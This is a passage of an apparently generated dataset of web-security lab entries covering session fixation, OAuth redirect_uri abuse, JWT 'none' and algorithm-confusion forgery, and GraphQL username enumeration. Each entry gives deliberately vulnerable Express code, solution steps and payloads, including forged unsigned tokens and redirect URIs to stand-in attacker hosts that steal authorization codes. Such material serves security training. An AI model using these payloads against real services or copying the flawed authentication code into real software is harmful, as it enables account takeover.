        "Verify the lab is solved by accessing protected content using the fixed session token."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 's3cr3t' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'sess' + Math.random().toString(36).substr(2); sessions[sid] = username; res.cookie('session', sid); return res.send('Logged in'); } return res.status(403).send('Unauthorized'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session]; if (username === 'carlos') return res.send('Account: carlos'); return res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
      "payloads": [
        "Cookie: session=attacker123",
        "POST /login with session=attacker123 then reuse it on /my-account"
      ]
    },
    {
      "Lab scenario": "OAuth token manipulation via redirect_uri parameter injection",
      "Lab Description": "This OAuth-based authentication flow is vulnerable to a redirect_uri validation flaw. It fails to strictly validate the domain of redirection endpoints, allowing attackers to steal OAuth authorization codes. To solve: Inject a malicious redirect_uri that sends the authorization code to your server, retrieve the stolen code, and use it to log in as Carlos.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to proxy the login process and inspect the OAuth authorization request.",
        "Identify the redirect_uri parameter and test injection using a trusted-looking subdomain (e.g., https://evil.example.com).",
        "Host a listener on your own server (e.g., ngrok) to receive the stolen code.",
        "Craft the full OAuth URL with the manipulated redirect_uri and trick the victim (Carlos) into clicking it.",
        "Capture the authorization code from your listener and exchange it manually at the OAuth provider's /token endpoint using Postman.",
        "Use the access_token in an authenticated request to /my-account to confirm lab success."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const validClients = ['app-client-1']; const authCodes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; if (!validClients.includes(client_id)) return res.status(403).send('Invalid client'); const code = Math.random().toString(36).substr(2); authCodes[code] = 'carlos'; const uri = `${redirect_uri}?code=${code}&state=${state}`; return res.redirect(uri); }); app.post('/token', (req, res) => { const { code } = req.body; if (!authCodes[code]) return res.status(403).send('Invalid code'); const token = 'access-token-' + Math.random().toString(36).substr(2); tokens[token] = authCodes[code]; return res.json({ access_token: token }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Carlos Account Accessed'); return res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(OAuth Redirection Lab running on http://localhost:${PORT}));",
      "payloads": [
        "https://oauth.example.com/authorize?client_id=app-client-1&redirect_uri=https://evil.example.com/steal&state=abc123",
        "POST /token with stolen code to get access_token",
        "Authorization: Bearer access-token-xyz123"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion vulnerability in token verification",
      "Lab Description": "The application verifies user sessions using JSON Web Tokens (JWTs). The JWT validation logic accepts any token using either the HS256 or RS256 algorithm. However, the public key used for RS256 verification is not securely isolated. The application trusts tokens signed with HS256 and validates them using a hardcoded RS256 public key, creating an algorithm confusion vector. To solve: forge a valid token to impersonate Carlos and access their account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept your JWT after logging in.",
        "Validate algorithm type and key handling by sending the token to jwt.io and modifying its header to 'alg':'none' or 'alg':'HS256'.",
        "Craft a new JWT with the header 'alg':'HS256' and payload { 'username': 'carlos' }, then sign it with the public key as a secret.",
        "Inject the modified token into the Authorization header and send a request to /account.",
        "If successful, the page will show Carlos's data. Confirm access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./keys/public.pem'); app.use(require('body-parser').json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Welcome ${decoded.username}`); } catch { res.status(403).send('Invalid token'); } }); app.listen(3000);",
      "payloads": [
        "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}, Payload: {\"username\":\"carlos\"}, Secret: <RS256 public key as string>",
        "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}, Unsigned JWT"
      ]
    },
    {
      "Lab scenario": "Session fixation in OAuth authorization redirect flow",
      "Lab Description": "The application uses OAuth for authentication via a third-party provider. However, the session ID is assigned before user authentication and not regenerated after login. This allows a malicious actor to fix a session ID by luring the victim into authenticating under a session the attacker controls. To solve: log in as Carlos using a fixed session and access their account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept the login OAuth redirect request using OWASP ZAP and capture the session cookie.",
        "Send the login link with the fixed session cookie attached to Carlos.",
        "When Carlos logs in via the OAuth provider, the session is updated with his credentials, but the session ID remains the same.",
        "Reuse the fixed session cookie in your browser and visit /account.",
        "Validate that Carlos's data is visible, confirming session hijack."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'oauthsecret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.session.oauth = 'init'; res.redirect('https://provider.com/oauth/authorize?client_id=abc&redirect_uri=http://localhost:3000/callback'); }); app.get('/callback', (req, res) => { req.session.user = 'carlos'; res.redirect('/account'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(3000);",
      "payloads": [
        "Set session cookie before OAuth login: connect.sid=abc123; send link with attached cookie to victim",
        "After victim authenticates, reuse connect.sid=abc123 to access /account"
      ]
    },
    {
      "Lab scenario": "Blind username discovery through GraphQL error differentiation",
      "Lab Description": "The application exposes a GraphQL endpoint that handles authentication queries. Due to a misconfigured error-handling mechanism, responses differ slightly based on the validity of the username during login attempts. This side-channel allows blind enumeration of usernames. To solve: enumerate Carlos's username and use it to brute-force his password to access his profile.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send GraphQL mutation queries with various usernames using Postman.",
        "Use Burp Suite Intruder to automate mutation testing for username values in the loginUser mutation.",
        "Analyze differences in HTTP status codes or error messages for invalid users vs wrong passwords.",
        "After finding Carlos's username, use Burp Intruder again to brute-force the password with fixed username.",
        "Login to the application and access /user/profile."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const users = { carlos: 'hunter2', admin: 'adminpass' }; const schema = buildSchema(` type Query { _: Boolean } type Mutation { loginUser(username: String!, password: String!): String } `); const root = { loginUser: ({ username, password }) => { if (!users[username]) throw new Error('Username not found.'); if (users[username] !== password) throw new Error('Incorrect password'); return 'Login successful'; } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: false })); app.listen(3000);",
      "payloads": [
        "{ \"query\": \"mutation { loginUser(username: \\\"carlos\\\", password: \\\"wrong\\\") }\" }",
        "{ \"query\": \"mutation { loginUser(username: \\\"admin\\\", password: \\\"adminpass\\\") }\" }"
      ]
    },
    {
      "Lab scenario": "JWT none algorithm override in REST API Authentication",
      "Lab Description": "This lab uses JWTs for session management but improperly trusts the 'alg' field in incoming tokens. The application does not validate the token signature if the 'alg' is set to 'none'. The application generates signed JWTs using the HS256 algorithm, but accepts unsigned tokens with 'alg: none'. To solve: forge an unsigned JWT to impersonate Carlos and access their profile.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to capture a valid JWT after logging in with your own account.",
        "Send the captured token to Repeater. Decode it using JWT.io or Burp Decoder.",
        "Modify the payload to set 'username': 'carlos' and change 'alg' in the header to 'none'. Remove the signature.",
        "Copy the modified unsigned JWT and set it as the Authorization header using Postman or Burp Repeater.",
        "Send a GET request to /api/profile with the forged token. Verify that Carlos's profile is displayed."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 'supersecret' }, 'wiener': { password: 'password123' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); return res.json({ token }); } return res.status(403).send('Access denied'); }); app.get('/api/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { return res.send(`Welcome ${decoded.payload.username}`); } try { const verified = jwt.verify(token, 'secretkey'); res.send(`Welcome ${verified.username}`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "OAuth2 redirect URI manipulation via open redirect in login provider",
      "Lab Description": "This OAuth flow integrates with an external identity provider (IdP), but the application accepts any redirection URI without proper validation. An attacker can manipulate the redirection URI during login to intercept authorization codes and hijack sessions. To solve: abuse the redirection vulnerability to authenticate as Carlos without credentials.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Start Burp and intercept the OAuth login request initiated by the client to /oauth/start?redirect_uri=...",
        "Observe the redirect_uri parameter and change it to a malicious domain under your control, such as https://evil.com.",
        "Host a listener at https://evil.com to capture the redirected authorization code after login.",
        "Use the captured code to manually construct a token request to the IdP and exchange it for an access token.",
        "Use the obtained token in Authorization headers to call /account/profile as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/start', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://idp.com/auth?response_type=code&client_id=app123&redirect_uri=${redirectUri}`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const code = req.query.code; const tokenResponse = await axios.post('https://idp.com/token', { code }); const userInfo = await axios.get('https://idp.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); res.send(`Welcome ${userInfo.data.username}`); }); app.listen(4000);",
      "payloads": [
        "https://idp.com/auth?response_type=code&client_id=app123&redirect_uri=https://evil.com",
        "Authorization: Bearer <token_exchanged_from_intercepted_code>"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session identifier in login flow",
      "Lab Description": "The login system assigns session identifiers before authentication and does not regenerate the session after successful login. An attacker can set a session ID via cookie and trick the victim into authenticating with it. The attacker then hijacks the session. To solve: fixate a session for Carlos and access their account using the same session ID.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send a request to /login while logged out and note the Set-Cookie header for session ID.",
        "Use Postman or Burp to set a fixed session ID manually via Cookie: session=attacker123.",
        "Send Carlos a phishing link or wait until Carlos logs in with the same fixed session ID.",
        "After Carlos logs in, reuse the same session cookie from your end.",
        "Request /account and confirm it now displays Carlos’s account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const users = { 'carlos': { password: '1234' }, 'admin': { password: 'root' } }; const sessions = {}; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'sess' + Math.floor(Math.random() * 1000); res.cookie('session', sessId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[req.cookies.session] = username; return res.send('Login successful'); } res.send('Login failed'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome to ${user}'s account`); } else { res.send('Please log in'); } }); app.listen(5000);",
      "payloads": [
        "Cookie: session=attacker123",
        "POST /login with session cookie already set to attacker123 and username=carlos&password=1234"
      ]
    },
    {
      "Lab scenario": "Session Fixation in OAuth Redirect Handler",
      "Lab Description": "The OAuth implementation in this application is vulnerable to session fixation. The redirect URI accepts a pre-set session identifier, which is not regenerated after successful login. The application fails to validate or rotate the session upon authentication. To solve: Hijack Carlos's session by injecting a known session ID during the OAuth redirect phase.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Burp Suite to intercept the OAuth login redirect and examine the session cookie behavior.",
        "Send the intercepted redirect request to Burp Repeater and inject a fixed session ID using Set-Cookie header.",
        "Craft the OAuth callback to include the known session ID in the redirect URL.",
        "Use Postman or curl to access the application with the fixed session after Carlos logs in.",
        "Visit /my-account to verify the hijacked session and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/oauth/callback', (req, res) => { const { session, user } = req.query; if (user === 'carlos') { res.cookie('session', session); res.redirect('/my-account'); } else { res.send('Invalid user'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'fixed-session-abc') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
      "payloads": [
        "GET /oauth/callback?session=fixed-session-abc&user=carlos",
        "Set-Cookie: session=fixed-session-abc",
        "curl -b 'session=fixed-session-abc' http://localhost:4000/my-account"
      ]
    },
    {
      "Lab scenario": "JWT None Algorithm Bypass in Auth Token Verification",
      "Lab Description": "This app validates JWT tokens using a vulnerable library that fails to enforce algorithm constraints. The JWT is signed with 'HS256', but the backend accepts 'none' and skips signature verification. To solve: Forge a token with 'none' algorithm, impersonate Carlos, and access his protected account area.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture a valid JWT token using Burp during your own login session.",
        "Decode the JWT using jwt.io or Postman and observe the algorithm field.",
        "Modify the JWT header to use 'alg':'none' and change the payload's sub field to carlos.",
        "Remove the signature section completely and replay the token using Burp or curl.",
        "Verify account takeover by accessing /my-account with the forged token."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.sub === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
        "curl -H \"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.\" http://localhost:4000/my-account"
      ]
    },
    {
      "Lab scenario": "Blind OAuth Token Leakage in Referer Header Injection",
      "Lab Description": "This OAuth flow redirects users to third-party domains after login. However, sensitive tokens are embedded in the Referer header due to improper scope isolation. The application fails to sanitize outbound redirects, leaking Carlos's OAuth token. To solve: Set up a malicious endpoint to intercept tokens and reuse the token to access Carlos’s account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Log in with your own OAuth account and monitor the Referer header using OWASP ZAP.",
        "Observe that the token is embedded in the Referer when redirected to external URLs.",
        "Set up a malicious site (e.g., webhook.site) and inject it as the redirect_uri via manipulated request.",
        "Trigger Carlos’s OAuth login with the crafted redirect_uri and capture the Referer header token.",
        "Replay the captured token using curl or Postman to access Carlos's protected resources."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const redirectMap = { 'carlos': 'http://malicious-site.com/steal?token=' }; app.get('/oauth/redirect', (req, res) => { const { user, token } = req.query; const target = redirectMap[user]; if (target) { res.redirect(`${target}${token}`); } else { res.send('User not found'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'secret-token-carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
      "payloads": [
        "GET /oauth/redirect?user=carlos&token=secret-token-carlos",
        "Authorization: Bearer secret-token-carlos",
        "curl -H \"Authorization: Bearer secret-token-carlos\" http://localhost:4000/my-account"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login process",
      "Lab Description": "This lab is vulnerable to session fixation due to improperly handled session tokens. The application issues a session cookie before authentication and continues using it after successful login. To solve the lab, fixate a session for Carlos and access his account after he logs in.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept initial GET /login request using Burp Suite and capture the issued session cookie.",
        "Send the cookie to the victim via a crafted link (e.g., phishing) or assume it was pre-set by attacker.",
        "Log in using Carlos's credentials while maintaining the fixed session (simulate Carlos using the attacker's session).",
        "Once login is successful, reuse the same session cookie on your browser.",
        "Visit /my-account using the fixed session and confirm account takeover."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixme', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.username) res.send(`Account page for ${req.session.username}`); else res.send('Please login'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: connect.sid=attackerSession123",
        "Session reuse after Carlos login",
        "Phishing link: http://victimsite.com/login with preset session"
      ]
    },
    {
      "Lab scenario": "JWT tampering vulnerability in session token validation",
      "Lab Description": "This lab is vulnerable to JWT signature tampering via `alg: none`. The application fails to properly validate JWT tokens' signature algorithm. To solve the lab, forge a JWT with `alg: none` and impersonate Carlos.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture a valid JWT from your own session using Burp or Postman.",
        "Decode the JWT using jwt.io or a script and observe the header and payload.",
        "Modify the payload to change the username to carlos.",
        "Set the JWT header to `{ \"alg\": \"none\", \"typ\": \"JWT\" }` and remove the signature.",
        "Send the forged JWT in the Authorization: Bearer header and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'secret123') { const token = jwt.sign({ username }, secret); res.json({ token }); } else res.status(403).send('Forbidden'); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); return res.send(`Welcome ${payload.username}`); } try { const verified = jwt.verify(token, secret); res.send(`Welcome ${verified.username}`); } catch { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
        "Payload: { \"username\": \"carlos\" }",
        "JWT: base64(header).base64(payload). (no signature)",
        "Authorization: Bearer <forged_token>"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration vulnerability in redirect URI validation",
      "Lab Description": "The lab's OAuth implementation accepts arbitrary redirect URIs due to a flawed validation logic. The application uses OAuth for login but does not strictly validate registered redirect URIs. To solve the lab, obtain an access token for Carlos by injecting a malicious redirect URI.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Access the login flow and intercept the request to /authorize using OWASP ZAP.",
        "Modify the `redirect_uri` parameter to your own malicious domain.",
        "Send the victim a link with this manipulated `redirect_uri` to steal the code.",
        "Capture the `code` parameter via your hosted server.",
        "Exchange the stolen code for an access token using /oauth/token endpoint and impersonate Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: false })); const validUsers = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; const redirect = redirect_uri;  res.send(`<form method=\"POST\" action=\"/login?redirect=${redirect}\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const redirect = req.query.redirect; if (username === 'carlos' && password === 'oauthpass') { res.redirect(`${redirect}?code=authcode123`); } else { res.send('Login failed'); } }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') res.json({ access_token: 'token-for-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization; if (token === 'Bearer token-for-carlos') res.send('Carlos account access granted'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://victim.com/authorize?client_id=123&redirect_uri=https://attacker.com/callback",
        "Stolen code: authcode123",
        "POST /oauth/token with { code: authcode123 }",
        "Authorization: Bearer token-for-carlos"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion vulnerability in session token verification",
      "Lab Description": "The application's authentication relies on JSON Web Tokens (JWT) for session validation. However, it insecurely trusts the algorithm header provided by the client, allowing an attacker to switch from 'RS256' to 'none' or 'HS256' and forge a valid token without the server's private key. The application signs session tokens with RSA but doesn't enforce algorithm validation. To solve: forge a JWT for the 'carlos' user and access the protected admin panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to intercept a valid JWT after authenticating with your own credentials.",
        "2. Decode the token using jwt.io or Postman, and observe the algorithm field set to 'RS256'.",
        "3. Modify the algorithm to 'none' and remove the signature, or switch it to 'HS256' and sign with the public key as the HMAC key.",
        "4. Send the crafted token in the Authorization header using Postman and attempt to access /admin-dashboard.",
        "5. Verify successful admin access by observing the response for admin-only data or 'Welcome carlos' message."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); const privateKey = fs.readFileSync('./private.pem'); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); jwt.verify(token, publicKey, (err, decoded) => { if (err) return res.sendStatus(403); if (decoded.username === 'carlos') res.send('Welcome carlos'); else res.sendStatus(403); }); }); app.listen(5000, () => console.log('JWT Algorithm Confusion Lab running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.[HMAC-SHA256-SIGNATURE-using-publicKey]"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow misconfiguration in third-party login endpoint",
      "Lab Description": "This lab's OAuth 2.0 login flow improperly accepts any token issued by an untrusted Authorization Server without validation. The application does not validate the issuer (`iss`) claim, allowing attackers to craft an access token with 'carlos' as the subject. To solve: craft a forged OAuth token using a dummy authorization server and log in as Carlos.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to capture the OAuth login process and inspect the 'access_token' parameter returned from the Authorization Server.",
        "2. Set up a fake OAuth server (such as with oauth-toolkit or mitmproxy) and create a signed JWT with the payload { 'sub': 'carlos' }.",
        "3. Intercept the redirect request using Burp and replace the legitimate access_token with your forged one.",
        "4. Replay the modified request to the target /auth/callback endpoint.",
        "5. Verify successful login as 'carlos' by accessing the /my-account endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/auth/callback', (req, res) => { const token = req.query.access_token; const payload = jwt.decode(token); if (payload && payload.sub) { res.send(`Logged in as ${payload.sub}`); } else { res.status(401).send('Invalid token'); } }); app.get('/my-account', (req, res) => { res.send('Welcome to your account page!'); }); app.listen(3000, () => console.log('OAuth Implicit Flow Lab running'));",
      "payloads": [
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjYXJsb3MifQ.[Valid-Signature-With-Your-Key]",
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session identifier in login endpoint",
      "Lab Description": "The web application creates a session identifier before authentication, and does not issue a new one upon successful login. This allows attackers to predefine a session ID, share it with the victim, and later hijack the session. To solve: Fixate a session, lure the victim into using it, then log in with the same session to access their My Account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use OWASP ZAP or Burp Suite to capture the session cookie issued before login.",
        "2. Manually set the session cookie to a known fixed value (e.g., SESSIONID=attacker-session).",
        "3. Send the link with the fixed session ID to the victim and ensure they log in without altering the session cookie.",
        "4. Reuse the same SESSIONID value to send an authenticated GET request to /my-account after the victim logs in.",
        "5. Confirm access to the victim's account page by verifying the returned user-specific content."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'supersecurepassword' }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username] === password) { res.send('Login successful'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const session = req.cookies['SESSIONID']; if (session === 'attacker-session') { res.send('Welcome carlos!'); } else { res.send('Not authorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "SESSIONID=attacker-session",
        "SESSIONID=known-fixed-session-id"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in session validation",
      "Lab Description": "This lab's authentication relies on JWTs for session validation. The server fails to enforce the algorithm specified in the token header and blindly trusts the signature when 'alg' is set to 'none'. The application fails to verify JWT signatures when the token's header declares 'none' as the algorithm, allowing an attacker to forge tokens. To solve: Forge a valid JWT for the user carlos and access their account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a login request and capture the JWT token issued for your own account.",
        "Inspect the token using jwt.io and confirm the header uses HS256 and the payload contains your username.",
        "Modify the token's header to use 'alg':'none' and the payload to set the username to 'carlos'. Remove the signature entirely.",
        "Send the forged JWT as a cookie in the Authorization header to /my-account and verify access to Carlos's account.",
        "Access the protected page and confirm the account data belongs to carlos, solving the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const secret = 'supersecretkey'; app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.cookie('auth', token).send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none' || jwt.verify(token, secret)) { res.send(`Account details for ${decoded.payload.user}`); } else { res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running on http://localhost:4000'));",
      "payloads": [
        "Header: {\"alg\":\"none\"}",
        "Payload: {\"user\":\"carlos\"}",
        "Token: base64url(header) + '.' + base64url(payload) + '.'"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session IDs",
      "Lab Description": "This lab's session management is vulnerable to fixation. The server issues predictable session IDs that are not regenerated upon successful login. An attacker can set a victim's session identifier before they log in and then reuse it to hijack the session. To solve: Fixate a session for the user carlos, wait for them to authenticate, then reuse the session ID to access their account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to intercept the initial unauthenticated GET request to /login and observe the Set-Cookie header containing a session ID.",
        "Send a crafted session ID (e.g., sessionid=attackercrafted123) in the Cookie header when visiting /login and verify the server accepts it.",
        "Entice the victim to log in while using the fixed sessionid=attackercrafted123 via a phishing link or CSRF.",
        "Once logged in, reuse the same sessionid=attackercrafted123 cookie to access /my-account directly.",
        "Confirm successful session takeover by accessing the user data for carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'securepass' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionid || `sess-${Math.random().toString(36).substr(2, 8)}`; res.cookie('sessionid', sessionId).send('Please log in'); }); app.post('/authenticate', (req, res) => { const { username, password } = req.query; if (users[username] === password) res.send(`Logged in as ${username}`); else res.status(401).send('Invalid login'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionid; if (sessionId === 'attackercrafted123') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
      "payloads": [
        "Cookie: sessionid=attackercrafted123",
        "Session Fixation Attack: Use same sessionid pre and post-login"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow misconfiguration",
      "Lab Description": "This lab's authentication relies on OAuth with implicit flow, but the client application fails to validate the 'state' parameter, making it vulnerable to CSRF-based token theft. The attacker can craft an authorization URL to leak the victim's token. To solve: Capture Carlos's OAuth token and use it to access his account page.",
